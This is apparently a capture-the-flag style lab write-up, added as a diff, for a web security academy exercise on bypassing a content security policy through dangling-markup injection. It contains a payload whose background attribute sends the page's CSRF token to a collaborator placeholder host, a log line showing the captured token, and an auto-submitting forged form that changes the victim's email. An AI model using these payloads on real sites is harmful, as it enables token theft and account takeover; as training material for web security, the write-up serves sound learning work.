@@ -1,0 +1,32 @@
+// 0. Injection point found at /email?email= URL parameter
+// 1. The change email page has CSP enabled. Cannot inject own JavaScript code as only code from its own origin allowed
+// 2. But still allow images to be loaded. We can inject our own HTML to steal CSRF and send to our own site; using tag background attribute to retrieve background image from external site
+
+<script>
+location='https://aca51f831e5b312680cb30e300e6008a.web-security-academy.net/email?email="><table background='//your-collaborator-id.burpcollaborator.net?';
+</script> 
+	// - "> is used to close the existing value tag attribute in <input> which email value will be rendered
+	// - <table background=' is used to start a new tag and background tag attribute can retrieve background image from external source.
+	// - //your-collaborator-id.burpcollaborator.net? is used to include the <input> field containing the csrf token on target page as parameter in our background image request to external source to exfiltrate info.
+
+// Stolen CSRF; appear in your own server access log
+
+1.30.49    2020-05-22 02:23:37  0000 "GET /?">                            <input required type="hidden" name="csrf" value="8RAOGMKj1tlFTGmzITszKVnkqrowCQ42">                            <button class= HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
+
+
+// Generate an fake HTML page containing a form that will generate the change email POST request with the stolen CSRF
+// Deliver to victim and the form will auto submit
+
+<html>
+<body>
+<script>history.pushState('','','/')</script>
+<form action="https://aca51f831e5b312680cb30e300e6008a.web-security-academy.net/email/change-email" method="POST">
+<input type="hidden" name="email" value="kiddie&#64;test&#46;com">
+<input type="hidden" name="csrf" value="8RAOGMKj1tlFTGmzITszKVnkqrowCQ42">
+<input type="submit" value="Submit request">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>                   
+</html>
